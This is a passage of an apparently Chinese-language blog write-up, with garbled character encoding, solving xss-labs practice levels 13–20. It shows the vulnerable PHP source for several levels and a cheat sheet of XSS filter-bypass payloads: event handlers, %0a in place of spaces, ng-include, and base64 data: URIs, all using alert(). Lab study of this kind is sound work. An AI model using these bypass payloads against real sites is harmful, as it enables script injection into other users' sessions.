<p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505211523636.png" alt="image-20250521152323582"></p>
<p>å‘ç°äº†inputæ ‡ç­¾ä¸­æœ‰t_cookå±æ€§</p>
<p>æƒ³åˆ°äº†åœ¨è¯·æ±‚åŒ…ä¸­çš„cookieå€¼ä¸­ä¼ å€¼</p>
<p>ä¿®æ”¹è¯·æ±‚åŒ…ä¸­çš„cookieå€¼</p>
<p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505211530482.png" alt="image-20250521153007439"></p>
<p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505211530961.png" alt="image-20250521153031910"></p>
<p>è¿™é‡Œç”¨åˆ°çš„æ˜¯<strong>onclickäº‹ä»¶ç»•è¿‡</strong></p>
<p><code>onclick</code> æ˜¯ JavaScript ä¸­æœ€å¸¸ç”¨çš„ HTML äº‹ä»¶ä¹‹ä¸€ï¼Œå®ƒä¼šåœ¨ç”¨æˆ·ç‚¹å‡»æŸä¸ªå…ƒç´ æ—¶è§¦å‘ï¼Œé€‚ç”¨äºå‡ ä¹æ‰€æœ‰çš„æ ‡ç­¾</p>
<p>ä¸éœ€è¦ä½¿ç”¨javascriptä¼ªåè®®</p>
<h1 id="level14ï¼ˆå›¾ç‰‡å±æ€§ä¼ xssä»£ç ï¼‰"><a href="#level14ï¼ˆå›¾ç‰‡å±æ€§ä¼ xssä»£ç ï¼‰" class="headerlink" title="level14ï¼ˆå›¾ç‰‡å±æ€§ä¼ xssä»£ç ï¼‰"></a>level14ï¼ˆå›¾ç‰‡å±æ€§ä¼ xssä»£ç ï¼‰</h1><p>å…³å¡é—®é¢˜ï¼Œæ— æ³•å®è·µ</p>
<p>ç›´æ¥ä¸Šå¤§ä½¬çš„è§£å†³åŠæ³•</p>
<p>è¿™å…³æ˜¯ä¼šå®šæ—¶è½¬è·³åˆ°ä¸€ä¸ªå¥‡æ€ªçš„å·²ç»æŒ‚æ‰äº†çš„ç½‘ç«™ï¼Œæœ¬æ¥æ˜¯åˆ©ç”¨è½¬è·³åˆ°çš„ç½‘ç«™ï¼Œåœ¨é‚£ç½‘ç«™å»ä¸Šä¼ ä¸€ä¸ªï¼Œå±æ€§é‡Œé¢å«æœ‰xssä»£ç çš„å›¾ç‰‡ï¼Œä»¥è¾¾åˆ°å¼¹çª—çš„æ•ˆæœ</p>
<p>è¿™å…³å¡çš„æ¼æ´åä¸º<strong>exif xss</strong>æ¼æ´ï¼Œexifæ˜¯<strong>å¯äº¤æ¢å›¾åƒæ–‡ä»¶</strong>æ ¼å¼</p>
<p>æ˜¯ä¸“é—¨ä¸ºæ•°ç ç›¸æœºçš„ç…§ç‰‡è®¾å®šçš„ï¼Œå¯ä»¥è®°å½•****æ•°ç ç…§ç‰‡çš„å±æ€§ä¿¡æ¯å’Œæ‹æ‘„æ•°æ®****ã€‚</p>
<p>æˆ‘ä»¬å³é”®å›¾ç‰‡é€‰æ‹©å±æ€§ï¼Œç‚¹å‡»è¯¦ç»†ä¿¡æ¯å°±å¯ä»¥çœ‹åˆ°exifçš„ç›¸å…³å±æ€§ã€‚</p>
<p><img src="https://image.3001.net/images/20210801/1627806356_61065a94900007104c897.png!small" alt="1627806356_61065a94900007104c897.png!small"></p>
<p>æˆ‘ä»¬å¯ä»¥åœ¨è¿™äº›å±æ€§é‡Œé¢æ·»åŠ XSSä»£ç ï¼Œç„¶åä¸Šä¼ å›¾ç‰‡å®ç°å¼¹çª—ã€‚</p>
<p><strong>åŸç†</strong></p>
<p>æ”»å‡»è€…åˆ©ç”¨äº†æ–‡ä»¶å±æ€§/å…ƒæ•°æ®å­—æ®µï¼ˆå¦‚æ ‡é¢˜ã€ä¸»é¢˜ã€æ ‡è®°ã€å¤‡æ³¨ç­‰ï¼‰æœªåšè¾“å…¥è¿‡æ»¤çš„æ¼æ´</p>
<p>ç›´æ¥åœ¨æ–‡æœ¬å­—æ®µä¸­æ’å…¥æ¶æ„ HTML/JavaScript ä»£ç </p>
<h1 id="level15ï¼ˆng-includeåŒ…å«è·¯å¾„æ— è§†htmlå®ä½“åŒ–ï¼‰"><a href="#level15ï¼ˆng-includeåŒ…å«è·¯å¾„æ— è§†htmlå®ä½“åŒ–ï¼‰" class="headerlink" title="level15ï¼ˆng-includeåŒ…å«è·¯å¾„æ— è§†htmlå®ä½“åŒ–ï¼‰"></a>level15ï¼ˆng-includeåŒ…å«è·¯å¾„æ— è§†htmlå®ä½“åŒ–ï¼‰</h1><p>è§‚å¯Ÿè¿™ä¸€å…³çš„ç½‘é¡µçš„æºç </p>
<p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505211554527.png" alt="image-20250521155420486"></p>
<p>å­˜åœ¨ä¸€ä¸ª<strong>ng-include:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ng-includeæŒ‡ä»¤å°±æ˜¯æ–‡ä»¶åŒ…æ¶µçš„æ„æ€ï¼Œç”¨æ¥åŒ…æ¶µå¤–éƒ¨çš„htmlæ–‡ä»¶ï¼Œå¦‚æœåŒ…æ¶µçš„å†…å®¹æ˜¯åœ°å€ï¼Œéœ€è¦åŠ å¼•å·</span><br><span class="line">æ³¨æ„ï¼š</span><br><span class="line">1.ng-include,å¦‚æœå•çº¯æŒ‡å®šåœ°å€ï¼Œå¿…é¡»è¦åŠ å¼•å·</span><br><span class="line">2.ng-include,åŠ è½½å¤–éƒ¨htmlï¼Œscriptæ ‡ç­¾ä¸­çš„å†…å®¹ä¸æ‰§è¡Œ</span><br><span class="line">3.ng-include,åŠ è½½å¤–éƒ¨htmlä¸­å«æœ‰styleæ ‡ç­¾æ ·å¼å¯ä»¥è¯†åˆ«</span><br><span class="line"></span><br><span class="line">4.ng-inclue,è®°è½½å¤–éƒ¨htmlä¸­çš„linkæ ‡ç­¾å¯ä»¥åŠ è½½</span><br></pre></td></tr></table></figure>

<p>æ„é€ payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">?src=&#x27;level1.php?name=&lt;img src=1 onclick=alert(1)&gt;&#x27;</span><br><span class="line">?src=&#x27;level1.php?name=&lt;img src=1 onerror=alert(1)&gt;&#x27;</span><br><span class="line">?src=&#x27;level1.php?name=&lt;p onmousedown=alert()&gt;å“ˆå“ˆå“ˆ&lt;/p&gt;&#x27;</span><br><span class="line">#onmousedown äº‹ä»¶å±æ€§</span><br><span class="line">å½“é¼ æ ‡æŒ‰é’®åœ¨å…ƒç´ ä¸Šè¢«æŒ‰ä¸‹æ—¶è§¦å‘</span><br><span class="line">ä¸åŒäº onclickï¼ˆéœ€è¦å®Œæ•´çš„ç‚¹å‡»åŠ¨ä½œï¼‰ï¼Œonmousedown åœ¨æŒ‰ä¸‹é¼ æ ‡æ—¶ç«‹å³è§¦å‘</span><br><span class="line">#onerror äº‹ä»¶,å½“å›¾ç‰‡åŠ è½½é”™è¯¯çš„æ—¶å€™è‡ªåŠ¨è§¦å‘æ‰§è¡Œjavascriptæ¶æ„ä»£ç </span><br></pre></td></tr></table></figure>

<p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505211609724.png"></p>
<p>ç‚¹å‡»æ¬¢è¿ç”¨æˆ·å³è¾¹ç”Ÿæˆçš„å›¾ç‰‡</p>
<p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505211610321.png" alt="image-20250521161002222"></p>
<p>è§‚å¯Ÿæœ¬å…³çš„æºç </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = $_GET[&quot;src&quot;];</span><br><span class="line">echo &#x27;&lt;body&gt;&lt;span class=&quot;ng-include:&#x27;.htmlspecialchars($str).&#x27;&quot;&gt;&lt;/span&gt;&lt;/body&gt;&#x27;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>æœ‰ä¸€ä¸ªHTMLå®ä½“åŒ–ç¼–ç å‡½æ•°</p>
<p><strong>å…³é”®ï¼š</strong></p>
<p><strong>ng-includeæ–‡ä»¶åŒ…æ¶µï¼Œå¯ä»¥æ— è§†htmlå®ä½“åŒ–</strong></p>
<h1 id="level16ï¼ˆç©ºæ ¼ç»•è¿‡ï¼Œæ— -æ ‡ç­¾ï¼‰"><a href="#level16ï¼ˆç©ºæ ¼ç»•è¿‡ï¼Œæ— -æ ‡ç­¾ï¼‰" class="headerlink" title="level16ï¼ˆç©ºæ ¼ç»•è¿‡ï¼Œæ— /æ ‡ç­¾ï¼‰"></a>level16ï¼ˆç©ºæ ¼ç»•è¿‡ï¼Œæ— /æ ‡ç­¾ï¼‰</h1><p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505211624483.png" alt="image-20250521162430437"></p>
<p>è¾“å…¥çš„å€¼è¢«æ’å…¥åˆ°äº†centeræ ‡ç­¾ä¸­</p>
<p>æµ‹è¯•è¿‡æ»¤</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?keyword=&quot; &#x27; sRc DaTa OnFocus OnmOuseOver OnMouseDoWn P &lt;sCriPt&gt; &lt;a hReF=javascript:alert()&gt; &amp;#106;</span><br></pre></td></tr></table></figure>

<p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505211626144.png" alt="image-20250521162630016"></p>
<p>é¦–å…ˆæ˜¯å­—æ¯çš„å°å†™åŒ–å°†scriptæ ‡ç­¾æ›¿æ¢ä¸ºç©ºæ ¼ï¼Œæœ€åå°†ç©ºæ ¼å®ä½“åŒ–</p>
<p>å°è¯•ä½¿ç”¨<p>æ ‡ç­¾ï¼Œä½†æ˜¯/ä¹Ÿè¢«æ›¿æ¢ä¸ºç©ºæ ¼äº†</p>
<p>è§‚å¯Ÿæºç ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = strtolower($_GET[&quot;keyword&quot;]);</span><br><span class="line">$str2=str_replace(&quot;script&quot;,&quot;&amp;nbsp;&quot;,$str);</span><br><span class="line">$str3=str_replace(&quot; &quot;,&quot;&amp;nbsp;&quot;,$str2);</span><br><span class="line">$str4=str_replace(&quot;/&quot;,&quot;&amp;nbsp;&quot;,$str3);</span><br><span class="line">$str5=str_replace(&quot;	&quot;,&quot;&amp;nbsp;&quot;,$str4);</span><br><span class="line">echo &quot;&lt;center&gt;&quot;.$str5.&quot;&lt;/center&gt;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>ç©ºæ ¼å¯ä»¥ç”¨å›è½¦æ¥ä»£æ›¿ç»•è¿‡ï¼Œå›è½¦çš„urlç¼–ç æ˜¯%0aï¼Œå†é…åˆä¸Šä¸ç”¨/çš„<img>ã€<details>ã€<svg>ç­‰æ ‡ç­¾</p>
<p>æ„é€ payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?keyword=&lt;svg%0aonclick=alert(1)&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505211632911.png" alt="image-20250521163237769"></p>
<p>æ„é€ payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?keyword=&lt;image%0Asrc=1%0Aonclick=alert(1)&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505211634008.png" alt="image-20250521163450844"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?keyword=&lt;svg%0Aonload=alert(1)&gt;</span><br><span class="line">onload äº‹ä»¶</span><br><span class="line">å½“ SVG å…ƒç´ å®ŒæˆåŠ è½½æ—¶è§¦å‘</span><br><span class="line">ä¸éœ€è¦ç”¨æˆ·äº¤äº’ï¼Œè‡ªåŠ¨æ‰§è¡Œ</span><br></pre></td></tr></table></figure>

<p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505211636647.png" alt="image-20250521163633529"></p>
<p>onloadäº‹ä»¶çš„è§¦å‘æ¡ä»¶</p>
<p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505211638997.png" alt="image-20250521163802944"></p>
<p><strong>æ³¨æ„ï¼š</strong></p>
<p>å›è½¦å¯ä»¥ç”¨æ¥ç­”é¢˜ç©ºæ ¼ï¼Œå›è½¦çš„urlçš„ç¼–ç æ˜¯%0A</p>
<h1 id="level17ï¼ˆemebdæ ‡ç­¾ï¼‰"><a href="#level17ï¼ˆemebdæ ‡ç­¾ï¼‰" class="headerlink" title="level17ï¼ˆemebdæ ‡ç­¾ï¼‰"></a>level17ï¼ˆemebdæ ‡ç­¾ï¼‰</h1><p>è§‚å¯Ÿç½‘é¡µçš„æºç </p>
<p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505211643076.png" alt="image-20250521164307032"></p>
<p>æµ‹å…³é”®å­—çš„è¿‡æ»¤</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?arg01=&quot; &#x27; sRc DaTa OnFocus OnmOuseOver OnMouseDoWn P &lt;sCriPt&gt; &lt;a hReF=javascript:alert()&gt;; &amp;arg02=&quot; &#x27; sRc DaTa OnFocus OnmOuseOver OnMouseDoWn P &lt;sCriPt&gt; &lt;a hReF=javascript:alert()&gt;;</span><br></pre></td></tr></table></figure>

<p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505211644582.png" alt="image-20250521164432456"></p>
<p>å­˜åœ¨htmlå®ä½“åŒ–å‡½æ•°</p>
<p>æ‰“å¼€åç¼€åä¸ºswfçš„æ–‡ä»¶ï¼ˆFLASHæ’ä»¶çš„æ–‡ä»¶ï¼Œç°åœ¨å¾ˆå¤šæµè§ˆå™¨éƒ½ä¸æ”¯æŒFLASHæ’ä»¶äº†ï¼‰</p>
<p>ä¸‹é¢ç®€å•è¯´æ˜äº†emebdæ ‡ç­¾ï¼Œè¿˜æœ‰æ”¯æŒembedæ ‡ç­¾çš„äº‹ä»¶</p>
<p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505211648761.png" alt="image-20250521164818702"></p>
<p>FLASHæ’ä»¶çº¯æ˜¯å‰¯ä½œç”¨</p>
<p>æ„é€ payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?arg02= onclick=alert()</span><br></pre></td></tr></table></figure>

<p>ç‚¹å‡»embedæ ‡ç­¾åŒºåŸŸ</p>
<p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505211650681.png" alt="image-20250521165047522"></p>
<p><strong>é—®é¢˜ï¼š</strong></p>
<p><strong>ä¸ºä»€ä¹ˆarg01ä½œä¸ºå‚æ•°ä¼ onclickäº‹ä»¶ä¸èƒ½å¤Ÿé¡ºåˆ©è§¦å‘ï¼Ÿ</strong></p>
<p>å½“arg1ä¸ºç©ºæ—¶ï¼Œhtmlæ ‡ç­¾è§£æä¸º</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;embed src=index.png&gt;=onclick=alert(1)</span><br></pre></td></tr></table></figure>

<p>æµè§ˆå™¨è§£æä¸ºï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;embed src=&quot;index.png&quot; =onclick=&quot;alert(1)&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>å¦‚æœæ˜¯arg1ä¼ çš„è¯</p>
<p>htmlæ ‡ç­¾è§£æä¸º</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;embed src=index.png&gt;onclick=alert(1)=test</span><br></pre></td></tr></table></figure>

<p>æµè§ˆå™¨è§£æä¸ºï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;embed src=&quot;index.png&quot; onclick=&quot;alert(1)=test&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>ä¸€ä¸ªèƒ½è§£æï¼Œä¸€ä¸ªä¸èƒ½çš„åŸå› æ˜¯ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ç¬¬ä¸€ç§ç­‰å·åœ¨ä¿®æ­£é”™è¯¯ä¸­è¢«å½“ä½œäº†å±æ€§åï¼Œåé¢çš„å°±è¢«å½“ä½œäº†å±æ€§å€¼æ¥è§¦å‘</span><br><span class="line">ç¬¬äºŒç§onclickè¢«å½“ä½œå±æ€§åï¼Œåé¢çš„è¢«å½“ä½œå±æ€§å€¼ï¼Œæ ¼å¼é”™è¯¯ä¸ä¼šè¢«æ‰§è¡Œ</span><br></pre></td></tr></table></figure>

<h1 id="level18ï¼ˆemebdæ ‡ç­¾ï¼‰"><a href="#level18ï¼ˆemebdæ ‡ç­¾ï¼‰" class="headerlink" title="level18ï¼ˆemebdæ ‡ç­¾ï¼‰"></a>level18ï¼ˆemebdæ ‡ç­¾ï¼‰</h1><p>ä¸ä¸Šä¸€å…³æ— åŒºåˆ«</p>
<h1 id="level19ï¼ˆemebdæ ‡ç­¾ï¼‰"><a href="#level19ï¼ˆemebdæ ‡ç­¾ï¼‰" class="headerlink" title="level19ï¼ˆemebdæ ‡ç­¾ï¼‰"></a>level19ï¼ˆemebdæ ‡ç­¾ï¼‰</h1><p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505211727982.png" alt="image-20250521172706893"></p>
<p>è™½ç„¶ç­”é¢˜ä¸ä¸Šé¢åŸºæœ¬ç›¸åŒï¼Œä½†æ˜¯è¿™é‡Œçš„åŒå¼•å·é—­åˆåŠ ä¸Šhtmlå®ä½“åŒ–ç¼–ç å°±è®©æˆ‘ä»¬ä¸èƒ½å¤Ÿé—­åˆ</p>
<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?arg01=version&amp;arg02=&lt;a href=&quot;javascript:alert()&quot;&gt;here&lt;/a&gt;</span><br></pre></td></tr></table></figure>

<p>è‡³äºä¸ºä»€ä¹ˆarg01è¦ä¼ versionï¼Œè·Ÿswfåç¼–è¯‘æœ‰å…³äº†</p>
<h1 id="level20"><a href="#level20" class="headerlink" title="level20"></a>level20</h1><p>ä¾æ—§åç¼–è¯‘</p>
<p>payloadï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?arg01=id&amp;arg02=xss\&quot;))&#125;catch(e)&#123;alert(1)&#125;//%26width=123%26height=123</span><br></pre></td></tr></table></figure>

<p>ä¹‹åå†å»æ·±ç©¶ä¸€ä¸‹ã€‚</p>
<h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>æ³¨æ„è¿‡æ»¤æµ‹è¯•ä»¥åŠå¦‚ä½•ç»•è¿‡ï¼Œå¯¹äºå¼•å·å¤§å°äºç¬¦å·çš„é—­åˆï¼Œå„ç§äº‹ä»¶çš„ä½¿ç”¨ä»¥åŠæ¡ä»¶çš„æ³¨æ„ï¼Œhrefçš„éšè—å±æ€§è‡ªåŠ¨è§£æHTMLå®ä½“åŒ–ç¼–ç ï¼ˆasciiè½¬unicodeï¼‰çš„åˆ©ç”¨ï¼Œå¯¹type="hidden"çš„è¦†ç›–ï¼Œhttpè¯·æ±‚å¤´çš„ä¼ å€¼ï¼ˆrefereï¼Œcookieï¼Œuser-agentç­‰ï¼‰ï¼Œéšè—GETPOSTçš„å‚æ•°å€¼çš„åˆ©ç”¨ï¼Œå›¾ç‰‡å±æ€§æ’å…¥xssä»£ç ï¼Œng-includeæ–‡ä»¶åŒ…æ¶µå¯ä»¥æ— è§†htmlå®ä½“åŒ–ï¼Œflash xssäº†è§£å³å¯ï¼ˆflashæ’ä»¶çš„æ·˜æ±°ï¼‰</p>
<h1 id="äº‹ä»¶æ€»ç»“"><a href="#äº‹ä»¶æ€»ç»“" class="headerlink" title="äº‹ä»¶æ€»ç»“"></a>äº‹ä»¶æ€»ç»“</h1><p>1.é…åˆjavascriptä¼ªåè®®</p>
<p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505211810795.png" alt="image-20250521181028732"></p>
<p>2.<img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505211812564.png" alt="image-20250521181208522"></p>
<ol start="3">
<li></li>
</ol>
<p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505211812784.png" alt="image-20250521181236746"></p>
<ol start="4">
<li></li>
</ol>
<p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505211812625.png" alt="image-20250521181256588"></p>
<ol start="5">
<li></li>
</ol>
<p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505211813307.png" alt="image-20250521181348264"></p>
<p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505211814370.png" alt="image-20250521181400315"></p>
<h1 id="ç»•è¿‡æ€»ç»“"><a href="#ç»•è¿‡æ€»ç»“" class="headerlink" title="ç»•è¿‡æ€»ç»“"></a>ç»•è¿‡æ€»ç»“</h1><h3 id="ç©ºæ ¼è¿‡æ»¤"><a href="#ç©ºæ ¼è¿‡æ»¤" class="headerlink" title="ç©ºæ ¼è¿‡æ»¤"></a>ç©ºæ ¼è¿‡æ»¤</h3><p>/ä»£æ›¿ç©ºæ ¼</p>
<p>å›è½¦ä»£æ›¿ç©ºæ ¼ï¼Œå†è¿›è¡Œurlç¼–ç å³%0a</p>
<h3 id="å¤§å°å†™ç»•è¿‡"><a href="#å¤§å°å†™ç»•è¿‡" class="headerlink" title="å¤§å°å†™ç»•è¿‡"></a>å¤§å°å†™ç»•è¿‡</h3><h3 id="åŒå†™ç»•è¿‡"><a href="#åŒå†™ç»•è¿‡" class="headerlink" title="åŒå†™ç»•è¿‡"></a>åŒå†™ç»•è¿‡</h3><h3 id="Unicodeç¼–ç ç»•è¿‡"><a href="#Unicodeç¼–ç ç»•è¿‡" class="headerlink" title="Unicodeç¼–ç ç»•è¿‡"></a>Unicodeç¼–ç ç»•è¿‡</h3><p>æµè§ˆå™¨ä¼šè‡ªåŠ¨å°† HTML å®ä½“ç¼–ç ï¼ˆå¦‚ <code>a</code>ï¼‰å’Œ Unicode è½¬ä¹‰åºåˆ—ï¼ˆå¦‚ <code>\u0061</code>ï¼‰è§£ç ä¸ºåŸå§‹å­—ç¬¦ï¼Œç„¶åå†æ‰§è¡Œ JavaScriptã€‚</p>
<h3 id="urlç¼–ç ç»•è¿‡ï¼ˆæ³¨å…¥ç‚¹å­˜åœ¨hrefï¼Œsrcå±æ€§ï¼‰"><a href="#urlç¼–ç ç»•è¿‡ï¼ˆæ³¨å…¥ç‚¹å­˜åœ¨hrefï¼Œsrcå±æ€§ï¼‰" class="headerlink" title="urlç¼–ç ç»•è¿‡ï¼ˆæ³¨å…¥ç‚¹å­˜åœ¨hrefï¼Œsrcå±æ€§ï¼‰"></a>urlç¼–ç ç»•è¿‡ï¼ˆæ³¨å…¥ç‚¹å­˜åœ¨hrefï¼Œsrcå±æ€§ï¼‰</h3><p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;javascript:alert(1)&quot;&gt;test&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">&lt;iframe src=&quot;javascript:alert(1)&quot;&gt;test&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>

<p>urlç¼–ç ï¼ˆä¸èƒ½å¯¹åè®®è¿›è¡Œä»»ä½•çš„ç¼–ç æ“ä½œï¼‰</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;javascript:%61%6c%65%72%74%28%31%29&quot;&gt;test&lt;/a&gt;</span><br><span class="line">&lt;iframe src=&quot;javascript:%61%6c%65%72%74%28%31%29&quot;&gt;test&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>

<h3 id="ASCII-Hex-å…«è¿›åˆ¶ç»•è¿‡"><a href="#ASCII-Hex-å…«è¿›åˆ¶ç»•è¿‡" class="headerlink" title="ASCII/Hex/å…«è¿›åˆ¶ç»•è¿‡"></a><strong>ASCII/Hex/å…«è¿›åˆ¶ç»•è¿‡</strong></h3><p>æµè§ˆå™¨ä¼šå…ˆå°†è¿™äº›ç¼–ç è¿›è¡Œè§£ç ï¼Œå†æ‰§è¡Œjs</p>
<h3 id="base64ç¼–ç "><a href="#base64ç¼–ç " class="headerlink" title="base64ç¼–ç "></a>base64ç¼–ç </h3><p>base64ç¼–ç é€šå¸¸éœ€è¦ä½¿ç”¨åˆ°dataä¼ªåè®®ï¼ˆå…è®¸ç›´æ¥åœ¨urlä¸­é—´æ’å…¥æ•°æ®ï¼Œå…è®¸æµè§ˆå™¨ç›´æ¥è§£æbase64ç¼–ç çš„jsä»£ç ï¼‰</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1.&lt;object&gt; æ ‡ç­¾</span><br><span class="line">&lt;object data=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=&quot;&gt;&lt;/object&gt;</span><br><span class="line">2.&lt;a&gt; æ ‡ç­¾</span><br><span class="line">&lt;a href=&quot;data:text/html;base64, PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=&quot;&gt;test&lt;/a&gt;   ï¼ˆæ–°ç‰ˆæµè§ˆå™¨ä¸æ”¯æŒï¼‰</span><br><span class="line">3.&lt;iframe&gt; æ ‡ç­¾</span><br><span class="line">&lt;iframe src=&quot;data:text/html;base64, PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">4.&lt;embed&gt; æ ‡ç­¾</span><br><span class="line">&lt;embed src=&quot;data:text/html;base64, PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=&quot;&gt;&lt;/embed&gt;</span><br></pre></td></tr></table></figure>



